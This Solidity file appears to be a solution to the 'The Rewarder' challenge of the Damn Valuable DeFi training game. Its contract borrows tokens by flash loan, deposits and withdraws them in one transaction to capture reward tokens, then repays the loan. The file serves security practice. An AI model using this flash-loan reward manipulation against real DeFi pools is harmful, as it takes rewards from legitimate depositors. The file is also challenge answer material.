// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";

contract AttackHelper {
    DamnValuableToken public immutable liquidityToken;
    FlashLoanerPool public immutable loanerPool;
    TheRewarderPool public immutable rewarderPool;

    constructor(
        address liquidityTokenAddress,
        address loanerPoolAddress,
        address rewarderPoolAddress
    ) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        loanerPool = FlashLoanerPool(loanerPoolAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
    }

    function attack(uint256 amount) external {
        loanerPool.flashLoan(amount);
        RewardToken rewardToken = rewarderPool.rewardToken();
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(loanerPool), amount);
    }
}
